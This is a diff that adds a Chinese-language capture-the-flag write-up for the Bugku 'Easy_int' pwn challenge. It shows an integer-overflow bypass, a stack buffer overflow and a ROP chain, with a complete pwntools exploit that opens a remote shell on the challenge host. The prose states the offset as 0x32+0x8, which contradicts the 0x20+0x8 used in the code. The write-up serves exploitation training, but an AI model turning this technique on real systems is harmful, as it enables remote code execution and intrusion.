@@ -16912,3 +16912,156 @@ io.interactive()
 
 ------
 
+## Bugku
+
+### Easy_int
+
+先`file ./pwn`查看文件类型，再`checksec --file=./pwn`检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/bugku]
+└─$ file ./pwn                 
+./pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=bb63f8ac4fad1bfa7d2fac330f91ae272d299862, for GNU/Linux 3.2.0, not stripped
+                                                                                                             
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/bugku]
+└─$ checksec --file=./pwn      
+[*] '/home/tyd/ctf/pwn/bugku/pwn'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+用`IDA Pro 64bit`打开附件`pwn`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  puts(" _       _                          __ _");
+  puts("(_)_ __ | |_    _____   _____ _ __ / _| | _____      __");
+  puts("| | '_ \\| __|  / _ \\ \\ / / _ \\ '__| |_| |/ _ \\ \\ /\\ / /");
+  puts("| | | | | |_  | (_) \\ V /  __/ |  |  _| | (_) \\ V  V /");
+  puts("|_|_| |_|\\__|  \\___/ \\_/ \\___|_|  |_| |_|\\___/ \\_/\\_/");
+  puts("Input your int:");
+  __isoc99_scanf("%d", &NUM);
+  if ( NUM < 0 )
+  {
+    NUM = -NUM;
+    if ( NUM < 0 )
+      vuln();
+    puts("No No No!");
+  }
+  return 0;
+}
+```
+
+当`NUM`是一个`int`类型的变量，其上限为$2^{31}-1$，即`2147483647`。当输入`2147483648`时会因为溢出而满足`NUM<0`的判断条件，而取反后同样会因为溢出而满足下一个`NUM<0`的判断条件，从而进入`vuln()`函数。
+
+```c
+int vuln()
+{
+  char buf[32]; // [rsp+0h] [rbp-20h] BYREF
+
+  puts("Congratulations!");
+  read(0, buf, 0x100uLL);
+  return system("ok!");
+}
+```
+
+双击查看`vuln()`函数可以发现`char`型数组`buf`的大小为`0x20`，但是`read()`函数能够从标准输入读取最多`0x100`个字节到`buf`变量，显然存在栈溢出漏洞。`buf`变量加上`0x32+0x8`个字节的偏移量能够覆盖到`rbp`，所以偏移量`offset=cyclic(0x32+0x8)`。
+
+在汇编代码中可以看到`call _system`的地址为`0x4011F0`。
+
+```assembly
+.text:00000000004011B6 ; __unwind {
+.text:00000000004011B6                 endbr64
+.text:00000000004011BA                 push    rbp
+.text:00000000004011BB                 mov     rbp, rsp
+.text:00000000004011BE                 sub     rsp, 20h
+.text:00000000004011C2                 lea     rdi, s          ; "Congratulations!"
+.text:00000000004011C9                 call    _puts
+.text:00000000004011CE                 lea     rax, [rbp+buf]
+.text:00000000004011D2                 mov     edx, 100h       ; nbytes
+.text:00000000004011D7                 mov     rsi, rax        ; buf
+.text:00000000004011DA                 mov     edi, 0          ; fd
+.text:00000000004011DF                 mov     eax, 0
+.text:00000000004011E4                 call    _read
+.text:00000000004011E9                 lea     rdi, command    ; "ok!"
+.text:00000000004011F0                 call    _system
+.text:00000000004011F5                 nop
+.text:00000000004011F6                 leave
+.text:00000000004011F7                 retn
+.text:00000000004011F7 ; } // starts at 4011B6
+```
+
+按`Shift + F12`能在`Strings window`中看到`/bin/sh`，其地址为`0x403500`。
+
+```assembly
+.data:0000000000403500 gift            db '/bin/sh',0
+```
+
+也可以用`ROPgadget --binary ./pwn --string "/bin/sh"`查看`/bin/sh`的地址。
+
+```bash
+$ ROPgadget --binary ./pwn --string "/bin/sh"
+Strings information
+============================================================
+0x0000000000403500 : /bin/sh
+```
+
+我们需要把`/bin/sh`传到`rdi`寄存器中，并且将其返回地址设置为`call system`。
+
+用`ROPgadget --binary ./pwn --only "pop|ret" `查看`pop rdi ; ret`的地址。
+
+```bash
+$ ROPgadget --binary ./pwn --only "pop|ret"  
+Gadgets information
+============================================================
+0x000000000040133c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040133e : pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000401340 : pop r14 ; pop r15 ; ret
+0x0000000000401342 : pop r15 ; ret
+0x000000000040133b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040133f : pop rbp ; pop r14 ; pop r15 ; ret
+0x000000000040119d : pop rbp ; ret
+0x0000000000401343 : pop rdi ; ret
+0x0000000000401341 : pop rsi ; pop r15 ; ret
+0x000000000040133d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040101a : ret
+
+Unique gadgets found: 11
+```
+
+`ROP`链如下：`payload = cyclic(0x20+0x8) + p64(pop_rdi) + p64(bin_sh) + p64(call_system)`。编写`Python`代码如下：
+
+```python
+from pwn import *
+
+# io = process('./pwn')
+io = remote('114.67.175.224', 17605)
+io.recvuntil(b'Input your int:\n')
+io.sendline(b'2147483648')
+io.recvuntil(b'Congratulations!\n')
+pop_rdi = 0x401343  # ROPgadget --binary ./pwn --only "pop|ret"
+call_system = 0x4011F0
+bin_sh = 0x403500  # ROPgadget --binary ./pwn --string "/bin/sh"
+payload = cyclic(0x20+0x8) + p64(pop_rdi) + p64(bin_sh) + p64(call_system)
+io.sendline(payload)
+io.interactive()
+```
+
+运行`Python`代码与靶机建立交互后输入`cat flag`得到`flag`，提交即可。
+
+```bash
+$ python easy_int.py
+[+] Opening connection to 114.67.175.224 on port 17605: Done
+[*] Switching to interactive mode
+sh: 1: ok!: not found
+$ cat flag
+flag{a76005b0cbd29892b0eee2813421f1a4}
+```
+
+------
